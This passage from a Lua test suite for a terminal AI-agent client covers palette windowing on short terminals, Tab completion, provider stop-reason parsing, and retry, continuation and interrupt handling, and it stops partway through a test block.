-- T83 (2.2/2.3/2.4/2.5/3.1): frames — the window follows the selection, the
-- overflow indicator sits in the row the reserved region already holds and is
-- built from digits and `/` only, a short terminal shrinks the window and drops
-- the indicator instead of painting over the separator or the status line, the
-- argument hint is visible on a skill row only, and a palette click is resolved
-- through the window offset.
do
  local agent_stub = { turn = function() return true end, get_history = function() return {} end }
  local function strip(s) return (s or ""):gsub("\27%[[%d;]*m", "") end
  local function many_skills()
    local out = {}
    for i = 1, 12 do
      out[i] = {
        name = "skill" .. string.format("%02d", i),
        description = "desc " .. i,
        path = "/tmp/skills/s" .. i .. "/SKILL.md",
      }
    end
    return out
  end
  local function boot(stub, size)
    local uimod = run_ui_with({ 17 }, { agent = agent_stub, size = size })
    uimod._skills_stub = stub
    return uimod
  end
  local function type_text(uimod, text)
    for i = 1, #text do
      uimod._handle_key({ kind = "text", char = text:sub(i, i) })
    end
  end
  local function rows_with(uimod, S, needle)
    local out = {}
    for r = 1, S.h do
      if strip(uimod._row(r)):find(needle, 1, true) then out[#out + 1] = r end
    end
    return out
  end

  -- 2.2/2.3: 19 entries on a 24-row terminal → an 8-row window plus indicator
  local uimod = boot(many_skills)
  type_text(uimod, "/")
  uimod._paint(true)
  local S = uimod._get_state()
  local L = uimod._layout()
  assert_eq(#S.palette_items, 19, "T83 twelve skills join the seven commands")
  local win, off = uimod._palette_window(S.h, #S.palette_items, S.palette_sel)
  assert_eq(win, 8, "T83 eight window rows")
  assert_eq(off, 1, "T83 the first entry starts the window")
  local painted = 0
  for i = 1, win do
    if strip(uimod._row(L.palette_row + i)):find("/", 1, true) then painted = painted + 1 end
  end
  assert_eq(painted, win, "T83 every window row is painted")
  assert_true(strip(uimod._row(L.palette_row + win + 1)):match("^%s*1/19%s*$") ~= nil,
    "T83 the indicator is digits and a slash")
  assert_true(L.palette_row + win + 1 <= L.footer_row - 1, "T83 the indicator row is inside the region")

  -- 2.2: the window follows the selection
  for _ = 1, 10 do uimod._handle_key({ kind = "special", name = "down" }) end
  uimod._paint(true)
  S = uimod._get_state()
  local win2 = uimod._palette_window(S.h, #S.palette_items, S.palette_sel)
  assert_eq(S.palette_sel, 11, "T83 the selection moved to the 11th entry")
  assert_eq(#rows_with(uimod, S, "/clear"), 0, "T83 the first entry is no longer painted")
  assert_true(#rows_with(uimod, S, S.palette_items[S.palette_sel].label) > 0,
    "T83 the selected entry is painted")
  assert_true(strip(uimod._row(L.palette_row + win2 + 1)):match("^%s*11/19%s*$") ~= nil,
    "T83 the indicator follows the selection")
  assert_true(strip(uimod._row(L.rule_bottom_row)):find("─", 1, true) ~= nil,
    "T83 the box bottom rule survives the palette")
  assert_true(strip(uimod._row(L.stats_row)):find("test", 1, true) ~= nil,
    "T83 the stats footer keeps its content")

  -- 3.1: the hint is on the skill row only
  local one = boot(function() return {
    { name = "deploy", description = "deploy stuff", path = "/tmp/skills/deploy/SKILL.md" } } end)
  type_text(one, "/")
  one._paint(true)
  local S1 = one._get_state()
  local L1 = one._layout()
  assert_eq(#S1.palette_items, 8, "T83 eight entries fit the window")
  local skill_rows = rows_with(one, S1, "/deploy")
  local command_rows = rows_with(one, S1, "/clear")
  assert_eq(#skill_rows, 1, "T83 the skill row is painted")
  assert_eq(#command_rows, 1, "T83 the command row is painted")
  assert_true(strip(one._row(skill_rows[1])):find("[задача]", 1, true) ~= nil,
    "T83 the skill row shows [задача]")
  assert_true(strip(one._row(command_rows[1])):find("[", 1, true) == nil,
    "T83 the command row shows no hint")
  assert_true(strip(one._row(L1.palette_row + 8 + 1)):match("%d+/%d+") == nil,
    "T83 no indicator while everything fits")

  -- 2.5: a click is resolved through the window offset
  local m = boot(many_skills)
  type_text(m, "/")
  for _ = 1, 10 do m._handle_key({ kind = "special", name = "down" }) end
  local Sm = m._get_state()
  local Lm = m._layout()
  local _, offm = m._palette_window(Sm.h, #Sm.palette_items, Sm.palette_sel)
  local target = Sm.palette_items[offm + 2] -- the third painted row
  assert_notnil(target, "T83 the third painted row has an entry")
  assert_true(target.skill, "T83 the third painted row is a skill")
  m._handle_key({ kind = "mouse", name = "press", row = Lm.palette_row + 3, col = 5, button = 0 })
  Sm = m._get_state()
  assert_eq(Sm.input, "/" .. target.name .. " ", "T83 the click follows the window offset")

  -- 2.5: the indicator row selects nothing
  local m2 = boot(many_skills)
  type_text(m2, "/")
  for _ = 1, 10 do m2._handle_key({ kind = "special", name = "down" }) end
  local S2 = m2._get_state()
  local L2 = m2._layout()
  local w2 = m2._palette_window(S2.h, #S2.palette_items, S2.palette_sel)
  local sel_before, input_before = S2.palette_sel, S2.input
  m2._handle_key({ kind = "mouse", name = "press", row = L2.palette_row + w2 + 1, col = 5, button = 0 })
  S2 = m2._get_state()
  assert_eq(S2.palette_sel, sel_before, "T83 the indicator row selects nothing")
  assert_eq(S2.input, input_before, "T83 the indicator row changes no input")
  assert_true(S2.palette_active, "T83 the palette stays open")

  -- 2.4: a 12-row terminal halves the window; the new dock budget
  -- (top rule + input + palette + bottom rule + 2 footer rows) leaves room
  -- for the entry rows, and the indicator only when one row remains.
  local t12 = boot(many_skills, { width = 80, height = 12 })
  type_text(t12, "/")
  t12._paint(true)
  local S12 = t12._get_state()
  local L12 = t12._layout()
  local w12 = t12._palette_window(S12.h, #S12.palette_items, S12.palette_sel)
  assert_eq(w12, 6, "T83 a 12-row terminal shrinks the window to half")
  -- The dock budget may shrink the reserved region below the ideal window+2
  -- (the transcript minimum takes priority); what must
  -- hold is that entries still paint inside the region and never past it.
  assert_true(L12.palette_h >= 1, "T83 the reserved region is non-empty")
  assert_true(L12.palette_h <= w12 + 2, "T83 the reserved region is at most window+2")
  local painted12 = 0
  local last12 = L12.footer_row - 1
  for r = L12.palette_row + 1, last12 do
    if strip(t12._row(r)):find("/", 1, true) then painted12 = painted12 + 1 end
  end
  assert_true(painted12 >= 1, "T83 the short terminal still paints palette entries")
  local irow12 = L12.palette_row + w12 + 1
  if irow12 <= last12 then
    assert_true(strip(t12._row(irow12)):match("^%s*1/19%s*$") ~= nil,
      "T83 the indicator fits when the region has room")
  end
  assert_true(strip(t12._row(L12.rule_bottom_row)):find("─", 1, true) ~= nil,
    "T83 bottom rule intact on a short terminal")
  assert_true(strip(t12._row(L12.footer_row)) ~= nil and strip(t12._row(L12.footer_row)) ~= "",
    "T83 footer row intact on a short terminal")
  assert_true(strip(t12._row(L12.stats_row)):find("test", 1, true) ~= nil,
    "T83 stats footer intact on a short terminal")

  -- 2.3: on an 8-row terminal the indicator has no room: it is dropped and the
  -- palette paints nothing over the bottom rule or the footer
  local t8 = boot(many_skills, { width = 80, height = 8 })
  type_text(t8, "/")
  t8._paint(true)
  local S8 = t8._get_state()
  local L8 = t8._layout()
  local w8 = t8._palette_window(S8.h, #S8.palette_items, S8.palette_sel)
  assert_true(L8.palette_row + w8 + 1 > L8.footer_row - 1, "T83 the indicator row is outside the region")
  for r = L8.palette_row + 1, L8.footer_row - 1 do
    assert_true(strip(t8._row(r)):match("%d+/%d+") == nil,
      "T83 no indicator is painted when it does not fit (row " .. r .. ")")
  end
  assert_true(#rows_with(t8, S8, "/clear") > 0, "T83 the palette still paints its window")
  assert_true(strip(t8._row(L8.rule_bottom_row)):find("─", 1, true) ~= nil,
    "T83 the bottom rule is never painted by the palette")
  assert_true(strip(t8._row(L8.footer_row)) ~= nil and strip(t8._row(L8.footer_row)) ~= "",
    "T83 the footer row is never painted by the palette")
  assert_true(strip(t8._row(L8.stats_row)):find("test", 1, true) ~= nil,
    "T83 the stats footer is never painted by the palette")

  print("T83 2.2-3.1 window/indicator/hint frames: OK")
end

-- T84 (1.2): Tab completion resolves tools through the host global — the
-- production lookup path, with no M._tools_stub in play. Regression: ui.lua
-- looked the module up with require("tools"), which the host does not provide
-- (modules are globals, main.c load_module), so Tab was a silent no-op in the
-- binary while every stubbed test still passed.
do
  local orig_tools = _G.tools
  local real_tools = { path_complete = function(token, _cfg)
    if token == "src/tether/ag" then
      return { candidates = { "src/tether/agent.lua" }, truncated = false }
    end
    return { candidates = {}, truncated = false }
  end }
  local uimod = run_ui_with({ 17 },
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  uimod._tools_stub = nil
  _G.tools = real_tools -- the harness restores globals after run()

  local input = "src/tether/ag"
  for i = 1, #input do
    uimod._handle_key({ kind = "text", char = input:sub(i, i) })
  end
  uimod._handle_key({ kind = "tab" })
  local S = uimod._get_state()
  assert_eq(S.input, "src/tether/agent.lua", "T84 Tab completes through the host global")
  assert_eq(S.cursor, #S.input, "T84 cursor follows the completion")
  assert_true(S.cursor <= #S.input, "T84 cursor never moves past the end of the input")

  -- a token with no candidate leaves the input alone (the lookup still worked)
  local uimod2 = run_ui_with({ 17 },
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  uimod2._tools_stub = nil
  _G.tools = real_tools
  for i = 1, #"src/nope" do
    uimod2._handle_key({ kind = "text", char = ("src/nope"):sub(i, i) })
  end
  uimod2._handle_key({ kind = "tab" })
  assert_eq(uimod2._get_state().input, "src/nope", "T84 no candidate leaves the input alone")

  -- the production path keeps text after the token too, with the cursor left
  -- directly after the completed path and before that text
  local uimod3 = run_ui_with({ 17 },
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  uimod3._tools_stub = nil
  _G.tools = real_tools
  local tailed = "src/tether/ag.bak"
  for i = 1, #tailed do
    uimod3._handle_key({ kind = "text", char = tailed:sub(i, i) })
  end
  for _ = 1, 4 do uimod3._handle_key({ kind = "special", name = "left" }) end
  uimod3._handle_key({ kind = "tab" })
  local S3 = uimod3._get_state()
  assert_eq(S3.input, "src/tether/agent.lua.bak", "T84 unique completion keeps the tail")
  assert_eq(S3.cursor, #"src/tether/agent.lua", "T84 cursor stops before the tail")
  assert_true(S3.cursor < #S3.input, "T84 cursor is not pushed to the end of the input")

  _G.tools = orig_tools
  print("T84 1.2 production tools lookup: OK")
end

-- T116: stop reasons are surfaced per provider, and a provider error fails the
-- attempt for every adapter (add-retry-and-continuation).
do
  local openai = assert(loadfile("src/tether/providers/openai.lua"))()
  local reasons = {}
  local function collect(e) if e.type == "done" then reasons[#reasons + 1] = e.reason end end

  openai.reset_stream()
  openai.parse_sse_line('data: {"choices":[{"delta":{"content":"x"},"finish_reason":"length"}]}', collect)
  openai.parse_sse_line('data: [DONE]', collect)
  assert_eq(reasons[1], "length", "T116 openai length reason")
  assert_eq(reasons[2], "length", "T116 the sentinel repeats the reason")
  openai.reset_stream()
  reasons = {}
  openai.parse_sse_line('data: {"choices":[{"delta":{},"finish_reason":"tool_calls"}]}', collect)
  assert_eq(reasons[1], "tool_calls", "T116 openai tool_calls reason")
  openai.reset_stream()
  reasons = {}
  openai.parse_sse_line('data: {"choices":[{"delta":{}}]}', collect)
  assert_eq(#reasons, 0, "T116 no reason without a finish_reason")

  local anthropic = assert(loadfile("src/tether/providers/anthropic.lua"))()
  anthropic.reset_stream()
  reasons = {}
  anthropic.parse_sse_line('data: {"type":"message_delta","delta":{"stop_reason":"max_tokens"},"usage":{"output_tokens":7}}', collect)
  anthropic.parse_sse_line('data: {"type":"message_stop"}', collect)
  assert_eq(reasons[1], "length", "T116 anthropic max_tokens")
  anthropic.reset_stream()
  reasons = {}
  anthropic.parse_sse_line('data: {"type":"message_delta","delta":{"stop_reason":"end_turn"}}', collect)
  anthropic.parse_sse_line('data: {"type":"message_stop"}', collect)
  assert_eq(reasons[1], "stop", "T116 anthropic end_turn")

  local gemini = assert(loadfile("src/tether/providers/gemini.lua"))()
  gemini.reset_stream()
  reasons = {}
  gemini.parse_sse_line('data: {"candidates":[{"content":{"parts":[{"text":"yo"}],"role":"model"},"finishReason":"MAX_TOKENS"}]}', collect)
  gemini.stream_finished(collect)
  assert_eq(reasons[1], "length", "T116 gemini MAX_TOKENS")
  gemini.reset_stream()
  reasons = {}
  gemini.parse_sse_line('data: {"candidates":[{"content":{"parts":[]},"finishReason":"SAFETY"}]}', collect)
  gemini.stream_finished(collect)
  assert_eq(reasons[1], "other", "T116 gemini unmapped reason")
  gemini.reset_stream()
  reasons = {}
  gemini.stream_finished(collect)
  assert_eq(reasons[1], "other", "T116 gemini without a reason")

  -- a provider error fails the attempt, and reset_stream clears it
  openai.reset_stream()
  openai.parse_sse_line('data: {"error":{"message":"rate limit exceeded"}}', function() end)
  assert_true(openai.stream_failure() ~= nil, "T116 openai error fails the attempt")
  anthropic.reset_stream()
  anthropic.parse_sse_line('data: {"type":"error","error":{"message":"Overloaded"}}', function() end)
  local af = anthropic.stream_failure()
  assert_true(af ~= nil and af.message:find("Overloaded", 1, true) ~= nil,
    "T116 anthropic error fails the attempt")
  gemini.reset_stream()
  gemini.handle_non_sse('{"candidates":[],"error":{"message":"gemini boom","code":500}}', function() end)
  local gf = gemini.stream_failure()
  assert_true(gf ~= nil and gf.message:find("gemini boom", 1, true) ~= nil,
    "T116 gemini error fails the attempt")
  gemini.reset_stream()
  assert_true(gemini.stream_failure() == nil, "T116 reset clears the failure")
  print("T116 provider stop reasons: OK")
end

-- T119: retry and continuation notices (add-retry-and-continuation). The UI
-- is driven through its agent-event seam after a run, like T84's key seam.
do
  local agent_stub = { turn = function() return true end, get_history = function() return {} end }
  local uimod, S = run_ui_with({ 17 }, { agent = agent_stub })
  local function find_entry(pred)
    for _, e in ipairs(tentries(uimod)) do if pred(e) then return e end end
  end
  -- attempt 1 streams text, then fails retryably
  uimod._handle_agent_event({ type = "text_delta", text = "half an ans", attempt = 1 })
  uimod._handle_agent_event({ type = "retry", attempt = 1, delay = 4.0,
                              reason = "server error / rate limit" })
  assert_eq(find_entry(function(e) return e.role == "assistant" and e.text == "half an ans" end),
    nil, "T119 the failed attempt's row is dropped")
  local retry_row = find_entry(function(e)
    return e.role == "system" and (e.text or ""):find("повтор 1", 1, true) ~= nil end)
  assert_notnil(retry_row, "T119 the retry row is appended")
  assert_true(retry_row and retry_row.text:find("4.0s", 1, true) ~= nil,
    "T119 the retry row names the wait")
  assert_true(retry_row and retry_row.text:find("rate limit", 1, true) ~= nil,
    "T119 the retry row names the reason")
  assert_notnil(S.retry_wait, "T119 the pending retry is tracked")
  assert_eq(S.retry_wait and S.retry_wait.attempt, 1, "T119 the pending attempt number")

  uimod._paint(true)
  local L119 = uimod._layout()
  local top_rule = uimod._row(L119.rule_top_row) or ""
  assert_true(top_rule:find("4.0s", 1, true) ~= nil,
    "T119 the top rule shows the pending retry, got: " .. top_rule:sub(1, 80))

  -- attempt 2's text is kept, and clears the pending indicator
  uimod._handle_agent_event({ type = "text_delta", text = "the answer", attempt = 2 })
  local kept = find_entry(function(e) return e.role == "assistant" and e.text == "the answer" end)
  assert_notnil(kept, "T119 the successful attempt's row is kept")
  assert_eq(kept and kept.attempt, 2, "T119 the row remembers its attempt")
  assert_eq(S.retry_wait, nil, "T119 the indicator clears on the next delta")
  assert_eq(find_entry(function(e)
    return e.role == "assistant" and e.text == "half an ans" end), nil,
    "T119 the failed attempt stays dropped")

  -- continuation notices
  uimod._handle_agent_event({ type = "continuation", kind = "length" })
  assert_notnil(find_entry(function(e)
    return e.role == "system" and (e.text or ""):find("продолжение", 1, true) ~= nil end),
    "T119 the continuation row is appended")
  uimod._handle_agent_event({ type = "continuation", kind = "empty" })
  assert_notnil(find_entry(function(e)
    return e.role == "system" and (e.text or ""):find("пустой", 1, true) ~= nil end),
    "T119 the empty-stop row is appended")
  assert_true(#uimod._render_all(80) > 0, "T119 the notices render")

  -- ASCII mode degrades the glyphs (the arrow becomes [r])
  local uimod2, S2 = run_ui_with({ 17 }, { agent = agent_stub })
  uimod2._ascii_mode = true
  uimod2._handle_agent_event({ type = "retry", attempt = 1, delay = 2.0,
                               reason = "connection error" })
  local saw_ascii, saw_arrow = false, false
  for _, r in ipairs(uimod2._render_all(80)) do
    if r:find("[r]", 1, true) then saw_ascii = true end
    if r:find("↻", 1, true) then saw_arrow = true end
  end
  assert_true(saw_ascii, "T119 the retry glyph degrades to [r] in ascii mode")
  assert_false(saw_arrow, "T119 no arrow glyph is left in ascii mode")
  uimod2._paint(true)
  local L119b = uimod2._layout()
  local top_rule2 = uimod2._row(L119b.rule_top_row) or ""
  assert_true(top_rule2:find("[r]", 1, true) ~= nil,
    "T119 the top-rule retry glyph is ascii, got: " .. top_rule2:sub(1, 80))
  print("T119 retry and continuation notices: OK")
end

-- T118: retry configuration resolution (add-retry-and-continuation).
do
  local config = assert(loadfile("src/tether/config.lua"))()
  local policy = assert(loadfile("src/tether/retry.lua"))()
  local home = "/tmp/tether_t118_home"
  os.execute("rm -rf " .. home .. " && mkdir -p " .. home .. "/.tether")

  local function write_config(body)
    local f = assert(io.open(home .. "/.tether/config.lua", "w"))
    f:write(body)
    f:close()
  end

  -- defaults: the retry table is present, and nothing caps the attempts
  local cfg0 = config.load(home .. "/.tether/no-config.lua", home)
  assert_eq(type(cfg0.retry), "table", "T118 retry table by default")
  assert_eq(cfg0.retry.base_delay_ms, 2000, "T118 default base delay")
  assert_eq(cfg0.retry.max_delay_ms, 60000, "T118 default max delay")
  assert_eq(cfg0.retry.multiplier, 2, "T118 default multiplier")
  assert_eq(cfg0.retry.max_failures_at_max_delay, 3, "T118 default max failures")
  assert_eq(cfg0.retry.max_attempts, nil, "T118 no default attempt cap")
  assert_eq(cfg0.retries, nil, "T118 retries is not a default")

  -- a partial retry table keeps the other defaults
  write_config('return { retry = { base_delay_ms = 5000 } }\n')
  local cfg1 = config.load(home .. "/.tether/config.lua", home)
  assert_eq(cfg1.retry.base_delay_ms, 5000, "T118 partial table overrides")
  assert_eq(cfg1.retry.max_delay_ms, 60000, "T118 partial table keeps defaults")
  assert_eq(policy.policy(cfg1).base_delay_ms, 5000, "T118 the policy reads it")

  -- a legacy retries value still caps the attempts
  write_config('return { retries = 5 }\n')
  local cfg2 = config.load(home .. "/.tether/config.lua", home)
  assert_eq(cfg2.retry.max_attempts, 5, "T118 legacy retries caps attempts")

  -- the new key wins over the legacy one
  write_config('return { retries = 5, retry = { max_attempts = 2 } }\n')
  local cfg3 = config.load(home .. "/.tether/config.lua", home)
  assert_eq(cfg3.retry.max_attempts, 2, "T118 retry.max_attempts wins")

  -- a malformed value does not stop the session; the policy falls back
  write_config('return { retry = { base_delay_ms = "soon" } }\n')
  local cfg4 = config.load(home .. "/.tether/config.lua", home)
  assert_eq(policy.policy(cfg4).base_delay_ms, 2000, "T118 malformed value falls back")

  os.execute("rm -rf " .. home)
  print("T118 retry configuration: OK")
end

-- T117: the turn-level retry loop and continuations (add-retry-and-
-- continuation). The provider is stubbed through the agent's `api` global, so
-- the assertions are about history shape, journal calls and event order.
with_modules(base_env, function(mods)
  local agent = mods.agent
  local policy = assert(loadfile("src/tether/retry.lua"))()
  local saved_context = _G.context
  _G.context = nil

  local journaled = {}
  _G.session = { append = function(_, ev) journaled[#journaled + 1] = ev end }

  local function make_stream(scripts)
    local st = { calls = 0, seen = {} }
    st.fn = function(_, _, messages, on_event)
      st.calls = st.calls + 1
      local copy = {}
      for i, m in ipairs(messages) do
        copy[i] = { role = m.role, content = m.content, tool_calls = m.tool_calls }
      end
      st.seen[st.calls] = copy
      local entry = scripts[st.calls] or {}
      for _, ev in ipairs(entry.events or {}) do on_event(ev) end
      if entry.ok == false then return false, entry.failure end
      return true
    end
    return st
  end

  local function run(scripts, delay_ms)
    local st = make_stream(scripts)
    _G.api = { stream = st.fn }
    local cfg = { workspace = "/tmp/ws", _session_id = "s1", auto_approve = {},
                  retry = { base_delay_ms = delay_ms or 1 } }
    local events = {}
    local ok = agent.turn(cfg, "k", "hello", function(ev) events[#events + 1] = ev end)
    return st, events, ok
  end

  local function count_role(history, role)
    local n = 0
    for _, m in ipairs(history) do if m.role == role then n = n + 1 end end
    return n
  end

  -- 1. a retryable failure is retried with the same conversation
  journaled = {}
  agent.clear()
  local st1, ev1 = run({
    { ok = false, failure = policy.failure("server", "rate limit exceeded", 429) },
    { events = { { type = "text_delta", text = "hi" }, { type = "done", reason = "stop" } } },
  })
  assert_eq(st1.calls, 2, "T117 a retryable failure is retried")
  local retries, errors = 0, 0
  for _, ev in ipairs(ev1) do
    if ev.type == "retry" then retries = retries + 1 end
    if ev.type == "error" then errors = errors + 1 end
  end
  assert_eq(retries, 1, "T117 one retry event")
  assert_eq(errors, 0, "T117 no error for a retried attempt")
  assert_eq(count_role(agent.get_history(), "user"), 1, "T117 one user message")
  assert_eq(#st1.seen[1], #st1.seen[2], "T117 the retry re-sends the same conversation")
  assert_eq(st1.seen[1][#st1.seen[1]].role, "user", "T117 the retry adds no message")
  local answer
  for _, m in ipairs(agent.get_history()) do
    if m.role == "assistant" then answer = m.content end
  end
  assert_eq(answer, "hi", "T117 the retried answer is kept")

  -- 2. a failed attempt leaves no trace, and its deltas carry its attempt
  journaled = {}
  agent.clear()
  local st2, ev2 = run({
    { ok = false, failure = policy.failure("server", "overloaded"),
      events = { { type = "text_delta", text = "half an ans" } } },
    { events = { { type = "text_delta", text = "final" }, { type = "done", reason = "stop" } } },
  })
  assert_eq(st2.calls, 2, "T117 a mid-stream failure is retried")
  local attempts = {}
  for _, ev in ipairs(ev2) do
    if ev.type == "text_delta" then attempts[#attempts + 1] = ev.attempt end
  end
  assert_eq(attempts[1], 1, "T117 deltas carry their attempt")
  assert_eq(attempts[#attempts], 2, "T117 the second attempt's deltas carry 2")
  for _, m in ipairs(agent.get_history()) do
    assert_false(m.role == "assistant" and type(m.content) == "string"
      and m.content:find("half an ans", 1, true) ~= nil,
      "T117 the failed attempt's text never reaches history")
  end
  for _, j in ipairs(journaled) do
    assert_false(j.type == "message" and j.content ~= nil and type(j.content) == "string"
      and j.content:find("half an ans", 1, true) ~= nil,
      "T117 the failed attempt's text is not journaled")
  end

  -- 3. a non-retryable failure stops at once with the provider's text
  agent.clear()
  local st3, ev3 = run({
    { ok = false, failure = policy.failure("permanent", "invalid api key") },
  })
  assert_eq(st3.calls, 1, "T117 a permanent failure is not retried")
  local msg3, kind3 = nil, nil
  for _, ev in ipairs(ev3) do
    if ev.type == "error" then msg3, kind3 = ev.message, ev.kind end
  end
  assert_eq(msg3, "invalid api key", "T117 the provider text is surfaced")
  assert_eq(kind3, "permanent", "T117 the error carries its kind")

  -- 4. a quota failure explains that the loop stopped
  agent.clear()
  local st4, ev4 = run({
    { ok = false, failure = policy.failure("quota", "You've hit your limit") },
  })
  assert_eq(st4.calls, 1, "T117 a quota failure is not retried")
  local msg4
  for _, ev in ipairs(ev4) do if ev.type == "error" then msg4 = ev.message end end
  assert_true(msg4 and msg4:find("retries stopped", 1, true) ~= nil,
    "T117 quota explains the stop")

  -- 5. abort during the wait stops the loop immediately
  agent.clear()
  local saved_sleep = _G.tether.sleep
  _G.tether.sleep = function() agent.abort_requested = true end
  local st5, ev5 = run({
    { ok = false, failure = policy.failure("connection", "ECONNRESET") },
    { events = { { type = "text_delta", text = "late" }, { type = "done", reason = "stop" } } },
  }, 60000)
  _G.tether.sleep = saved_sleep
  assert_eq(st5.calls, 1, "T117 an abort during the wait stops the loop")
  local aborted = false
  for _, ev in ipairs(ev5) do if ev.type == "aborted" then aborted = true end end
  assert_true(aborted, "T117 aborted is emitted")
  assert_false(agent.abort_requested, "T117 the abort flag is cleared")

  -- 6. a truncated answer is continued into one assistant entry
  journaled = {}
  agent.clear()
  local st6, ev6 = run({
    { events = { { type = "text_delta", text = "part one " }, { type = "done", reason = "length" } } },
    { events = { { type = "text_delta", text = "part two" }, { type = "done", reason = "stop" } } },
  })
  assert_eq(st6.calls, 2, "T117 a truncated answer is continued")
  local conts = 0
  for _, ev in ipairs(ev6) do if ev.type == "continuation" and ev.kind == "length" then conts = conts + 1 end end
  assert_eq(conts, 1, "T117 one continuation event")
  local history6 = agent.get_history()
  local assistants6 = {}
  for _, m in ipairs(history6) do
    if m.role == "assistant" then assistants6[#assistants6 + 1] = m end
  end
  assert_eq(#assistants6, 1, "T117 the answer is one assistant entry")
  assert_eq(assistants6[1].content, "part one part two", "T117 the answer is merged")
  assert_eq(count_role(history6, "user"), 1, "T117 the hidden continuation leaves history")
  local last6 = st6.seen[2][#st6.seen[2]]
  assert_eq(last6.role, "user", "T117 the continuation is a user turn")
  assert_true(type(last6.content) == "string" and last6.content:find("Continue", 1, true) ~= nil,
    "T117 the continuation text is sent")
  local journaled_assistants = 0
  for _, j in ipairs(journaled) do
    if j.type == "message" and j.role == "assistant" then journaled_assistants = journaled_assistants + 1 end
  end
  assert_eq(journaled_assistants, 1, "T117 the merged answer is journaled once")

  -- 7. an empty answer is nudged once, then answered
  agent.clear()
  local st7, ev7 = run({
    { events = { { type = "done", reason = "stop" } } },
    { events = { { type = "text_delta", text = "answer" }, { type = "done", reason = "stop" } } },
  })
  assert_eq(st7.calls, 2, "T117 an empty answer is nudged once")
  local nudges = 0
  for _, ev in ipairs(ev7) do if ev.type == "continuation" and ev.kind == "empty" then nudges = nudges + 1 end end
  assert_eq(nudges, 1, "T117 one nudge event")
  local history7 = agent.get_history()
  assert_eq(count_role(history7, "user"), 1, "T117 the nudge does not add a user turn")
  local users7 = {}
  for _, m in ipairs(history7) do if m.role == "user" then users7[#users7 + 1] = m end end
  assert_eq(users7[1].content, "hello", "T117 the nudge is not left in the user message")
  local nudged = st7.seen[2][#st7.seen[2]]
  assert_true(type(nudged.content) == "string" and nudged.content:find("hello", 1, true) == 1
    and nudged.content:find("empty", 1, true) ~= nil, "T117 the nudge is folded into the user turn")
  local answer7
  for _, m in ipairs(history7) do if m.role == "assistant" then answer7 = m.content end end
  assert_eq(answer7, "answer", "T117 the nudged answer is kept")

  -- 8. two empty answers give up with one error
  agent.clear()
  local st8, ev8 = run({
    { events = { { type = "done", reason = "stop" } } },
    { events = { { type = "done", reason = "stop" } } },
  })
  assert_eq(st8.calls, 2, "T117 the empty answer is nudged exactly once")
  local errs8 = 0
  for _, ev in ipairs(ev8) do if ev.type == "error" then errs8 = errs8 + 1 end end
  assert_eq(errs8, 1, "T117 giving up emits one error")

  -- 9. continuations are bounded by the iteration cap
  agent.clear()
  local endless = {}
  local st9 = make_stream(setmetatable({}, { __index = function()
    return { events = { { type = "text_delta", text = "x" }, { type = "done", reason = "length" } } }
  end }))
  _G.api = { stream = st9.fn }
  agent.turn({ workspace = "/tmp/ws", auto_approve = {}, retry = { base_delay_ms = 1 } },
    "k", "go", function() end)
  assert_eq(st9.calls, 50, "T117 the iteration cap bounds continuations")

  -- T120 (group 8): the interrupt the host delivers. While a turn blocks the
  -- UI is not reading stdin, so the host watches it and reports Ctrl+C through
  -- tether.abort_requested(); the turn must stop exactly as for the UI flag,
  -- and must clear it again so the next turn is not aborted by a spent Ctrl+C.
  local saved_abort = _G.tether.abort_requested
  local saved_clear = _G.tether.clear_abort
  local saved_t_sleep = _G.tether.sleep
  -- The host flag is sticky: it stays set until the turn clears it, so the same
  -- Ctrl+C keeps aborting an in-flight transfer until the turn has stopped.
  local interrupt, cleared = false, 0
  _G.tether.abort_requested = function() return interrupt end
  _G.tether.clear_abort = function() cleared = cleared + 1; interrupt = false end

  local function saw(events, kind)
    for _, ev in ipairs(events) do if ev.type == kind then return true end end
    return false
  end

  -- 10. an interrupt that arrives during the backoff wait ends the wait, and is
  -- cleared so the next turn is not aborted by the Ctrl+C that ended this one
  agent.clear()
  interrupt, cleared = false, 0
  _G.tether.sleep = function() interrupt = true end
  local st10, ev10 = run({
    { ok = false, failure = policy.failure("connection", "ECONNRESET") },
    { events = { { type = "text_delta", text = "late" }, { type = "done", reason = "stop" } } },
  }, 60000)
  _G.tether.sleep = saved_t_sleep
  assert_eq(st10.calls, 1, "T120 a host interrupt during the wait stops the loop")
  assert_true(saw(ev10, "aborted"), "T120 aborted is emitted")
  assert_false(saw(ev10, "error"), "T120 an aborted turn reports no error")
  -- the retry notice precedes the wait; the abort ends it, and no second attempt
  -- is ever sent
  local retry_seen, abort_seen = 0, 0
  for i, ev in ipairs(ev10) do
    if ev.type == "retry" then retry_seen = i end
    if ev.type == "aborted" then abort_seen = i end
  end
  assert_true(retry_seen > 0 and retry_seen < abort_seen,
    "T120 the interrupted wait follows its retry notice")
  assert_false(interrupt, "T120 the handled interrupt is cleared, not left set")
  assert_eq(cleared, 2, "T120 cleared at the turn start and when the abort is handled")

  -- 11. an interrupt raised while the transfer is in flight (what the libcurl
  -- progress callback does): the transfer fails, and the turn still ends as
  -- aborted rather than retrying the transport error
  agent.clear()
  interrupt, cleared = false, 0
  local st11 = make_stream({
    { ok = false, failure = policy.failure("interrupted", "interrupted by user") },
    { events = { { type = "done", reason = "stop" } } },
  })
  local real_stream11 = st11.fn
  _G.api = { stream = function(...) interrupt = true; return real_stream11(...) end }
  local ev11 = {}
  agent.turn({ workspace = "/tmp/ws", _session_id = "s1", auto_approve = {},
               retry = { base_delay_ms = 1 } },
      "k", "hello", function(ev) ev11[#ev11 + 1] = ev end)
  assert_eq(st11.calls, 1, "T120 an aborted transfer is not retried")
  assert_true(saw(ev11, "aborted"), "T120 an aborted transfer ends the turn as aborted")
  assert_false(saw(ev11, "error"), "T120 an aborted transfer shows no error banner")

  -- 11b. and if the flag was already consumed, the interrupted kind is still not
  -- retryable — the turn ends with the distinct message instead of looping
  agent.clear()
  interrupt, cleared = false, 0
  local st11b, ev11b = run({
    { ok = false, failure = policy.failure("interrupted", "interrupted by user") },
    { events = { { type = "done", reason = "stop" } } },
  }, 1)
  assert_eq(st11b.calls, 1, "T120 an interrupted failure with no flag is not retried")
  local kind11b, msg11b = nil, nil
  for _, ev in ipairs(ev11b) do
    if ev.type == "error" then kind11b = ev.kind; msg11b = ev.message end
  end
  assert_false(saw(ev11b, "retry"), "T120 the interrupted fallback never retries")
  assert_eq(kind11b, "interrupted", "T120 the fallback error carries its kind")
